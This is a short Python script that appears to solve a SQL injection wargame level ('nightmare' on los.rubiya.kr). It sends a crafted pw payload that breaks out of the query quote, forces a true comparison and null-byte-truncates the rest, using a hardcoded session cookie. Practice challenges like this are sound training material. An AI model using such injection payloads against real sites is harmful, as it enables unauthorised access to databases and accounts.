import requests

header = {"Cookie": "PHPSESSID=lldbmoaqjlmg994kn38cc31dlc;"}
url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"

payload = "?pw=')=0;%00"

res = requests.get(url + payload, headers=header)

if "Clear!" in res.text:
    print("Clear!")